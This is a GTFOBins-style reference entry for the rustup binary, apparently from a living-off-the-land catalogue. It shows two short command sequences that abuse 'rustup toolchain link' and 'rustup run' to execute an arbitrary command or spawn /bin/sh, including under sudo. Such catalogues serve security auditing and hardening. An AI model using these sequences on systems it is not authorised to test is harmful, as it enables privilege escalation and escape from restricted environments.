---
type: gtfobin
name: rustup
platform: Unix
functions: [command, shell]
tags: [gtfobin, unix, lotl]
---

# rustup

## command

```bash
mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
echo '/path/to/command' >/path/to/temp-dir/bin/rustc
chmod +x /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc
```
**Contexts:** sudo, unprivileged

## shell

```bash
mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
cp /bin/sh /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc
```
**Contexts:** sudo, unprivileged
